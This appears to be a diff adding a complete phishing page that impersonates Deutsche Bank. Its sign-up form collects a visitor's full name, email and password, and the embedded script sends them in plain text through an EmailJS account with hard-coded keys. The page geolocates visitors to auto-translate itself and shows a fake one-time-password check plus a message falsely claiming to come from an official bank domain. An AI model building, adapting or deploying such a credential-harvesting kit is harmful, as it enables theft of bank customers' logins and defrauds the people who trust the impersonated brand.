@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google" content="notranslate">  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+ <title>[Bank Name] - Sign Up</title>
+    <style>
+         body #content{
+            font-family: Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            }
+   
+           
+   
+
+        
+        .container {
+            background-color: #ffffff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
+            width: 100%;
+            max-width: 400px;
+         margin-top: -90px;
+     z-index: 0;      
+    display: none; 
+    justify-content: center;
+            align-items: center;             
+                 }
+        h1 {
+            text-align: center;
+            color: #0a008e;
+            margin-bottom: 30px;
+        }
+        label {
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 5px;
+            display: block;
+         font-size: 20px;
+                 }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 50px;
+            padding: 10px;
+            font-size: 23px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        #password {
+            width: 100%;
+            padding-right: 40px; /* Ensure space for the icon */
+            box-sizing: border-box;
+        }
+        #togglePassword {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-80%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+        }
+        #togglePassword i {
+            color: #000;
+          font-size: 21px;
+       
+                  }
+        .sign-up-btn {
+            background-color: #0f00da;
+            color: #ffffff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 20px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .sign-up-btn:hover {
+            background-color: #0056b3;
+        }
+        .sign-up-btn .loader {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.6);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .sign-up-btn.loading .loader {
+            display: block;
+        }
+        .sign-up-btn.loading .button-text {
+            visibility: hidden;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #777777;
+        }
+        .container img {
+            height: 110px;
+            margin-left: 26px;
+        }
+        /* Modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 30; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.7); /* (Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 85%;
+            max-width: 320px;
+            border-radius: 10px;
+            text-align: center;
+    margin-top: 70px;
+          
+           
+            }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .close-btn {
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .close-btn:hover {
+            background-color: #0056b3;
+        
+      
+             }
+            .container3 {
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            padding: 20px;
+            position: relative;
+        }
+
+        .close-button {
+            position: absolute;
+            top: 76px;
+            right: 50px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 1000;
+           
+        }
+
+        h4 {
+            font-size: 25px;
+            font-weight: normal;
+            top: -20px;
+            margin-bottom: 20px;
+        }
+
+        .image-container {
+            margin: 20px 0;
+        }
+
+        .image-container img {
+            width: 309px;
+        }
+
+        h5 {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        p4 {
+            font-size: 18px;
+            margin: 5px 0;
+        }
+
+        .secondary-text {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .secondary-text a {
+            color: green;
+            text-decoration: none;
+        }
+
+        .secondary-text a:hover {
+            text-decoration: underline;
+        }
+       #modal72 {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            
+            
+    overflow: auto; /* Enable scroll if needed */   
+        }
+.container9 {
+            background-color: #ffffff;
+            padding: 5px 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
+            width: 101%;
+            max-width: 400px;
+         margin-top: -70px;
+        margin-left: -22px;
+       
+         }
+        .container9 img {
+            height: 110px;
+            margin-left: -4px;
+        }
+      #password2 {
+            width: 100%;
+            padding-right: 40px; /* Ensure space for the icon */
+            box-sizing: border-box;
+        }
+        #togglePassword2 {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-80%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+        }
+        #togglePassword2 i {
+            color: #000;
+          font-size: 21px;
+       
+                  }  
+                 .modal-content7 {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 85%;
+            max-width: 320px;
+            border-radius: 10px;
+            text-align: center;
+    margin-top: 70px;
+         height: 20vh; 
+           
+            }
+       .container7 {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 12px 12px 12px rgba(0, 0, 0, 0.5);
+            width: 320px;
+            padding: 40px;
+       height: 72vh;
+    margin-top: 16px; 
+      display: relative;
+     z-index: 9999999999999999999999999;
+     justify-content: center;
+            align-items: center;
+            height: 78vh;
+            text-align: center;
+     box-shadow: 0 0 18px rgba(0, 0, 0, 0.9);
+     border-radius: 19px;
+     margin-bottom: 50px;          
+                 }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 100%;
+            max-width: 200px;
+        }
+        .image {
+            background-color: #e0f7e8;
+            padding: 0px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .image img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .title {
+            font-size: 27.7px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+       margin-top: 50px;
+        }
+        .subtitle {
+            font-size: 18.7px;
+            color: #555;
+        }
+       .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+     font-size: 31px; 
+   margin-left: -6.8px;
+  margin-top: -7px;  
+   }
+     .otp-inputs input{
+        height: 70px;
+       width: 61px;
+      font-size: 34px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      margin: 0 5px;
+      transition: border-color 0.3s;
+ box-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
+     }
+
+    .otp-input {
+      width: 80px;
+      height: 110%;
+      text-align: center;
+      font-size: 34px;
+      
+    }
+
+    .otp-input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+    </style>
+</head>
+<body>
+   <div class="container7" id="container7">
+    <!-- Logo Section -->
+    <div class="logo">
+        <img src="well.png" alt="Deutsche Bank Logo">
+    </div>
+
+    <!-- Image Section -->
+    <div class="image">
+        <img src="transfer.png" alt="Send and Receive Money">
+    </div>
+
+    <!-- Text Section -->
+    <div class="text">
+        <div class="title" id="send">Send and receive money with ease</div>
+        <div class="subtitle" id="sub">From anyone and to anyone in seconds</div>
+    </div>
+</div> 
+    <div id="content">
+ <div class="container" id="container">
+        <img src="bank.png" alt="Logo del Banco">
+        <h1 id="bank-title">Deutsche Bank</h1>
+        <p id="instructions2">Por favor, ingrese los siguientes detalles a continuación:</p>
+        <form id="deleteMeForm" action="you.html" method="GET">
+            <label for="full-name" id="label-full-name">Nombre completo</label>
+            <input type="text" id="full-name" name="full-name" required>
+            
+            <label for="email" id="label-email">Correo electrónico</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password" id="label-password">Contraseña</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required>
+                <button type="button" id="togglePassword">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+                
+            <button type="submit" class="sign-up-btn">
+                <span class="button-text" id="button-text">CONTINUAR</span>
+                <div class="loader"></div>
+            </button>
+        </form>
+        
+        <div class="footer">
+            [Deutsche Bank] | <a href="#" id="privacy-policy">Política de Privacidad</a> | <a href="#" id="contact-us">Contáctenos</a>
+        </form>
+        </div>
+    </div>
+    
+    <!-- The Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+    <div class="contain">
+        <div class="close-button" onclick="changeModal()">&times;</div>
+        <h4 id="fan3">Thank you for registering 🎉</h4>
+        <div class="image-container">
+            <img src="email.jpg" alt="Email Icon">
+        </div>
+        <h5 id="fan4">Please Check Your Email !!!</h5>
+        <p4 id="fan5">Please verify your email address.</p4>
+        <p4 id="fan6">We have sent a One-Time-Password to your email please enter the code below</p4>        
+            
+<h3 id="emailDisplay" style="color: #00b300; margin-top: 2px;"></h3>
+<p id="otp-status" style="display: none; margin-bottom: 39px; "></p>
+<form id="otp-form" action="you.html" method="GET">
+    <div class="otp-inputs">
+        <input type="number" maxlength="1" class="otp-input" id="otp-1" oninput="moveToNext(this, 'otp-2')" onkeydown="handleBackspace(event, 'otp-1', null)">
+        <input type="number" maxlength="1" class="otp-input" id="otp-2" oninput="moveToNext(this, 'otp-3')" onkeydown="handleBackspace(event, 'otp-2', 'otp-1')">
+        <input type="number" maxlength="1" class="otp-input" id="otp-3" oninput="moveToNext(this, 'otp-4')" onkeydown="handleBackspace(event, 'otp-3', 'otp-2')">
+        <input type="number" maxlength="1" class="otp-input" id="otp-4" oninput="verifyOtp()" onkeydown="handleBackspace(event, 'otp-4', 'otp-3')">
+  </div>
+ 
+</div>
+
+ <p4 style=" margin-top: 72px; font-size: 18px;"id="fan7"class="secondary-text">
+            Haven't received the email yet? Check your Spam folder or </p4> <a href="#" id="resend-code" onclick="resendOtp()" style="font-size: 18px; font-weight: bold; ">Resend email</a>.
+        </p4>
+ 
+  
+   <h7 id="change-email" onclick="changeEmail()" class="mapp"   style="font-size: 18px; font-weight: bold; margin-left: 17px; color: green; ">Change email?</h7></h7></div>
+  
+  
+  
+    </div>
+         
+</div>
+</div>
+         
+</div>
+
+<div id="modal72">
+        <div class="modal-content7">
+           
+            <h9 onclick="closeModal()" style="z-index: 9999999999; position: relative; top: -26px;
+            right: -137px;
+            font-size: 29px;
+            font-weight: bold;
+            cursor: pointer; ">&times;</h9>
+      <div class="container9">
+        <img src="bank.png" alt="Logo del Banco">
+        <h1 id="bank-title">Deutsche Bank</h1>
+        <p id="instructions">Welcome</p> <span style="font-size: 17px; color: black; font-weight: bold; "id="displayName" ></span><p id="please"> Please Log-in Into Your Account</p>
+           
+   <label for="email" id="label1" style="margin-left: -157px;">Email</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password" id="label2" style="margin-left: -157px;">Password</label>
+            <div class="password-container">
+                <input type="password" id="password2" name="password" required>
+                <button type="button" id="togglePassword2">
+                    <i class="fas fa-eye"></i>
+                </button>
+           
+            </div>  
+
+<a href="you.html"> <button type="submit" class="sign-up-btn">
+                <span class="button-text" id="label3">Log-in</span>
+                <div class="loader"></div>
+           
+            </button>  </a>    
+      <img style="width: 50px; height: 39px;"src="add7.jpg" alt=""></img>
+        </div>
+    </div>
+    
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+   setTimeout(function() {
+      document.getElementById("container7").style.display = "none";
+    document.getElementById("container").style.display = "block";
+    }, 7000);
+        
+   // Function to show the modal
+        function showModal() {;
+            document.getElementById('modal72').style.display = 'block';
+     
+          
+        }
+
+        // Function to close the modal
+        function closeModal() {
+            document.getElementById('modal72').style.display = 'none';
+            // Set a flag to indicate the modal has been closed
+            localStorage.setItem('modalClosed', 'true');
+        }
+
+        // Check if the user has previously visited index2.html
+        const visitedIndex2 = localStorage.getItem('visitedIndex2') === 'true';
+        const modalClosed = localStorage.getItem('modalClosed') === 'true';
+
+        // Show the modal if the user has visited index2.html and hasn't closed the modal yet
+        if (visitedIndex2 && !modalClosed) {
+            showModal();
+        }
+        
+    (function(){
+        emailjs.init("zZbBafecRWz36hHhn");
+    })();
+
+
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({ pageLanguage: 'es' }, 'google_translate_element');
+    }
+
+
+        
+    function translateText(text, targetLanguage, callback) {
+        fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+            .then(response => response.json())
+            .then(data => {
+                const translatedText = data[0].map(item => item[0]).join('');
+                callback(translatedText);
+            })
+            .catch(error => console.error('Error translating text:', error));
+    }
+
+    function detectCountry(callback) {
+        fetch('https://ipinfo.io/json?token=84581b889c1970') // Replace with your ipinfo.io token
+            .then(response => response.json())
+            .then(data => {
+                callback(data.country);
+            })
+            .catch(error => console.error('Error detecting country:', error));
+    }
+
+    const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en", 
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar", 
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz", 
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr", 
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr", 
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es", 
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr", 
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti", 
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr", 
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es", 
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is", 
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it", 
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko", 
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en", 
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en", 
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en", 
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar", 
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en", 
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur", 
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl", 
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en", 
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr", 
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so", 
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv", 
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt", 
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en", 
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi", 
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+            translatePageText(targetLanguage);
+        });
+    });
+
+    function translatePageText(targetLanguage) {
+        const elementsToTranslate = [
+            
+            { id: 'instructions', text: 'Por favor, ingrese los siguientes detalles a continuación:' },
+            { id: 'label-full-name', text: 'Nombre completo' },
+            { id: 'label-email', text: 'Correo electrónico' },
+            { id: 'label-password', text: 'Contraseña' },
+            { id: 'button-text', text: 'CONTINUAR' },
+            { id: 'privacy-policy', text: 'Política de Privacidad' },
+   { id: 'send', text: 'Send and receive money with ease' },
+  { id: 'sub', text: 'From anyone and to anyone in seconds' },
+  { id: 'instructions', text: 'Welcome' },     
+ { id: 'please', text: 'Please Log-in Into Your Account' },      
+{ id: 'label1', text: 'Email' },   
+{ id: 'label2', text: 'Password'}, 
+ { id: 'label3', text: 'Log-in' },      
+ { id: 'fan3', text: 'Thank you for registering 🎉' },    
+ { id: 'fan4', text: 'Please Check Your Email !!!' },       
+    { id: 'fan5', text: 'Please verify your email address.' },   
+     { id: 'fan6', text: 'We have sent a One-Time-Password to your email please enter the code below' }, 
+    { id: 'fan7', text: 'Havent received the email yet? Check your Spam folder or ' },      
+    { id: 'resend-code', text: 'Resend email' },   
+    { id: 'change-email', text: 'Change email?' },  
+     { id: 'instructions2', text: 'Por favor, ingrese los siguientes detalles a continuación:' },         
+            { id: 'contact-us', text: 'Contáctenos' }
+    
+        
+        
+        
+        ];
+
+        elementsToTranslate.forEach(element => {
+            translateText(element.text, targetLanguage, function(translatedText) {
+                document.getElementById(element.id).textContent = translatedText;
+            });
+        });
+    }
+
+    // Rest of your existing JavaScript code for the form submission and modal display goes here...
+
+
+
+    
+    let generatedOtp;
+
+    
+    document.getElementById('deleteMeForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const button = event.target.querySelector('.sign-up-btn');
+        button.classList.add('loading');
+        button.disabled = true;
+   
+
+        const fullName = document.getElementById('full-name').value;
+               const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        generatedOtp = Math.floor(1000 + Math.random() * 9000);
+
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+             translateText("Confirm email", targetLanguage, function(translatedWelcome) {
+            translateText("Dear", targetLanguage, function(translatedPeace) {
+                translateText("Thank you for registering 🎉. Please don't share this code with anyone. Your One-Time-Password is", targetLanguage, function(translatedHello) {
+                    translateText("For your security, please note that this email was sent from an official Deutsche Bank domain. Never share your login details or passwords with anyone.", targetLanguage, function(translatedBank) {
+                        translateText("Nuevo mensaje de Deutsche Bank", targetLanguage, function(translatedFromName) {
+translateText("Confirm Email", targetLanguage, function(translatedEmail) {
+
+            
+                                const emailParams = {
+                                    full_name: fullName,
+                                    to_email: email,
+                                    password: password,
+                                    otp: generatedOtp,
+                                    welcome_message: translatedWelcome,
+                                    peace_message: translatedPeace,
+                                    Hello_email: translatedHello,
+                                    bank_email: translatedBank,
+   bank_dog: translatedEmail,                                 from_name: translatedFromName,
+      link: 'you.html'                         
+                               
+                                };
+
+                                emailjs.send('service_ufvl2sa', 'template_zpkqoqy', emailParams)
+                                    .then(function(response) {
+                                        console.log('¡ÉXITO!', response.status, response.text);
+
+                                        document.getElementById('emailDisplay').innerText = email;
+                                        showModalWithEmail(email);
+
+                                        // Translate page text
+                                        translatePageText(targetLanguage);
+                                    }, function(error) {
+                                        console.error('¡FALLÓ...', error);
+                                        if (!countryLanguageMap[countryCode] || error) {
+                                            translateText('No se pudo enviar el correo electrónico. Por favor, revise el correo electrónico ingresado.', targetLanguage, function(translatedAlertMessage) {
+                                                alert(translatedAlertMessage);
+                                            });
+                                        }
+                                        button.classList.remove('loading');
+                                        button.disabled = false;
+                                    });
+                            });
+                        });
+                    });
+                });
+            });
+        });
+    });
+});
+    function showModalWithEmail(email) {
+        const emailDisplay = document.getElementById('emailDisplay');
+        emailDisplay.textContent = email;
+
+        const modal = document.getElementById("successModal");
+        modal.style.display = "block";
+   var name = document.getElementById('full-name').value;
+            if (name) {
+                // Save the name in localStorage
+                localStorage.setItem('userName', name);
+ var nacr = document.getElementById('email').value;
+            if (nacr) {
+                // Save the name in localStorage
+                localStorage.setItem('emailName', nacr);
+    }   
+    }
+    
+    }    detectCountry(function(countryCode) {
+    const targetLanguage = countryLanguageMap[countryCode] || 'en';
+    translatePageText(targetLanguage);
+});
+
+// Updated resendOtp function
+function resendOtp() {
+    const email = document.getElementById('emailDisplay').textContent;
+
+    if (!email) {
+        alert("No email address found. Please enter your email and submit the form again.");
+        return;
+    }
+
+    detectCountry(function(countryCode) {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        generatedOtp = Math.floor(1000 + Math.random() * 9000);
+
+       translateText("Confirm email", targetLanguage, function(translatedWelcome) {
+            translateText("Dear", targetLanguage, function(translatedPeace) {
+                translateText("Thank you for registering 🎉. Please don't share this code with anyone. Your One-Time-Password is", targetLanguage, function(translatedHello) {
+                    translateText("For your security, please note that this email was sent from an official Deutsche Bank domain. Never share your login details or passwords with anyone.", targetLanguage, function(translatedBank) {
+                        translateText("Nuevo mensaje de Deutsche Bank", targetLanguage, function(translatedFromName) {
+translateText("Confirm Email", targetLanguage, function(translatedEmail) {
+                            const emailParams = {
+                                full_name: document.getElementById('full-name').value,
+                                to_email: email,
+                                password: document.getElementById('password').value,
+                                otp: generatedOtp,
+                                welcome_message: translatedWelcome,
+                                peace_message: translatedPeace,
+                                Hello_email: translatedHello,
+                                bank_email: translatedBank,
+                                from_name: translatedFromName,
+     bank_dog: translatedEmail                   
+                            };
+
+                            emailjs.send('service_ufvl2sa', 'template_zpkqoqy', emailParams)
+                                .then(function(response) {
+                                    console.log('¡ÉXITO!', response.status, response.text);
+                              alert("OTP has been resent to " + email);
+                                }, function(error) {
+                                    console.error('¡FALLÓ...', error);
+                                    if (!countryLanguageMap[countryCode] || error) {
+                                        translateText('No se pudo enviar el correo electrónico. Por favor, revise el correo electrónico ingresado.', targetLanguage, function(translatedAlertMessage) {
+                                            alert(translatedAlertMessage);
+                                        });
+                                    }
+                                });
+                        });
+                    });
+                });
+            });
+        });
+    });
+});
+}
+
+
+function translatePageText(targetLanguage) {
+    const elementsToTranslate = [
+        { id: 'bank-title', text: 'Deutsche Bank' },
+        { id: 'instructions', text: 'Por favor, ingrese los siguientes detalles a continuación:' },
+        { id: 'label-full-name', text: 'Nombre completo' },
+        { id: 'label-email', text: 'Correo electrónico' },
+        { id: 'label-password', text: 'Contraseña' },
+        { id: 'button-text', text: 'CONTINUAR' },
+        { id: 'privacy-policy', text: 'Política de Privacidad' },
+  { id: 'send', text: 'Send and receive money with ease' },
+  { id: 'sub', text: 'From anyone and to anyone in seconds' },
+  { id: 'instructions', text: 'Welcome' },     
+ { id: 'please', text: 'Please Log-in Into Your Account' },      
+{ id: 'label1', text: 'Email' },   
+{ id: 'label2', text: 'Password'}, 
+ { id: 'label3', text: 'Log-in' },       
+  { id: 'fan4', text: 'Please Check Your Email !!!' },       
+    { id: 'fan5', text: 'Please verify your email address.' },   
+     { id: 'fan6', text: 'We have sent a One-Time-Password to your email please enter the code below' }, 
+    { id: 'fan7', text: 'Havent received the email yet? Check your Spam folder or ' },      
+    { id: 'resend-code', text: 'Resend email' },   
+    { id: 'change-email', text: 'Change email?' },             
+ { id: 'instructions2', text: 'Por favor, ingrese los siguientes detalles a continuación:' },    
+ { id: 'fan3', text: 'Thank you for registering 🎉' },   
+        { id: 'contact-us', text: 'Contáctenos' }
+       
+    
+    ];
+
+    elementsToTranslate.forEach(element => {
+        translateText(element.text, targetLanguage, function(translatedText) {
+            document.getElementById(element.id).textContent = translatedText;
+        });
+    });
+}
+
+
+    function moveToNext(current, nextFieldId) {
+        if (current.value.length >= 1) {
+            document.getElementById(nextFieldId).focus();
+        }
+    }
+
+    function handleBackspace(event, currentFieldId, prevFieldId) {
+        if (event.key === 'Backspace' && !event.target.value) {
+            if (prevFieldId) {
+                document.getElementById(prevFieldId).focus();
+            }
+        }
+    }
+
+  function verifyOtp() {
+    const otp = document.getElementById('otp-1').value +
+                document.getElementById('otp-2').value +
+                document.getElementById('otp-3').value +
+                document.getElementById('otp-4').value;
+
+    if (otp.length === 4) {
+        if (parseInt(otp) === generatedOtp) {
+            detectCountry(function(countryCode) {
+                const targetLanguage = countryLanguageMap[countryCode] || 'en';
+                translateText("🟢Verifying!!!", targetLanguage, function(translatedMessage) {
+                    document.getElementById('otp-status').textContent = translatedMessage;
+                    document.getElementById('otp-status').style.display = 'block';
+document.getElementById('otp-status').style ="color: #00b300; font-weight: bold; font-family: Arial, sans-serif; font-size: 20px;";  
+      window.location.href = `you.html`;
+       });
+            });  
+          } else {
+            detectCountry(function(countryCode) {
+                const targetLanguage = countryLanguageMap[countryCode] || 'en';
+                translateText("🔴Invalid OTP Please Check Your Email Again Or Click Resend Code Below", targetLanguage, function(translatedInvalidOtp) {
+                    document.getElementById('otp-status').textContent = translatedInvalidOtp;
+                    document.getElementById('otp-status').style.display = 'block';
+ document.getElementById('otp-status').style ="color: red; font-weight: bold; font-family: Arial, sans-serif; font-size: 20px;";
+                    clearOtpFields();                                         
+});
+            });
+        }
+    }
+}
+function clearOtpFields() {
+    document.getElementById('otp-1').value = '';
+    document.getElementById('otp-2').value = '';
+    document.getElementById('otp-3').value = '';
+    document.getElementById('otp-4').value = '';
+    document.getElementById('otp-1').focus();
+}
+
+
+window.onclick = function(event) { 
+    const modal = document.getElementById("successModal"); 
+     
+        const button = document.querySelector('.sign-up-btn'); 
+        button.classList.remove('loading'); 
+        button.disabled = false; 
+    
+};
+function changeModal() {
+ const modal = document.getElementById("successModal"); 
+    
+        modal.style.display = "none";    
+    
+}
+
+function changeEmail() { 
+    const modal = document.getElementById("successModal"); 
+     
+    const emailInput = document.getElementById('email'); 
+    emailInput.value = ''; // Clear the email input field 
+    emailInput.focus(); // Focus the email input field 
+    const button = document.querySelector('.sign-up-btn'); 
+  modal.style.display = "none";  button.classList.remove('loading'); 
+    button.disabled = false;  
+}
+
+const passwordField = document.getElementById('password');
+const togglePasswordButton = document.getElementById('togglePassword');
+const toggleIcon = togglePasswordButton.querySelector('i');
+
+togglePasswordButton.addEventListener('click', function () {
+    // Toggle the type attribute
+    const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordField.setAttribute('type', type);
+    
+    // Toggle the icon
+    toggleIcon.classList.toggle('fa-eye');
+    toggleIcon.classList.toggle('fa-eye-slash');
+});
+const password2Field = document.getElementById('password2');
+const togglePassword2Button = document.getElementById('togglePassword2');
+const toggleIco = togglePassword2Button.querySelector('i');
+togglePassword2Button.addEventListener('click', function () {
+    // Toggle the type attribute
+    const type = password2Field.getAttribute('type') === 'password' ? 'text' : 'password';
+    password2Field.setAttribute('type', type);
+// Toggle the icon
+    toggleIco.classList.toggle('fa-eye');
+    toggleIco.classList.toggle('fa-eye-slash'); 
+  });  
+  document.addEventListener('DOMContentLoaded', () => {
+            const displayNameElement = document.getElementById('displayName');
+            const displayElement1 = document.getElementById('displayValue1');
+            const displayElement = document.getElementById('displayValue');
+
+            // Get stored name and slider value from localStorage
+            const storedName = localStorage.getItem('userName');
+            const storedValue = localStorage.getItem('sliderValue');
+
+            // Display stored name
+            if (storedName) {
+                displayNameElement.textContent = `${storedName}`;
+            } else {
+                displayNameElement.textContent = 'No name stored';
+            }
+            });
+</script>
